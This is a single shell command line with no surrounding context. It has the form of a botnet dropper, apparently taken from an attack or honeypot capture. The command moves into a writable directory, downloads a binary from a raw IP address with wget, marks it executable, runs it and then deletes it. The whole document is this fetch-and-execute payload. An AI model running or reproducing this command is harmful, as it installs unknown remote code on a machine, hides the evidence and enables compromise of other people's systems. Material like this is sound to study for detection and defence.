cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://62.4.1.222/tftp; chmod +x tftp; ./tftp; rm -rf tftp
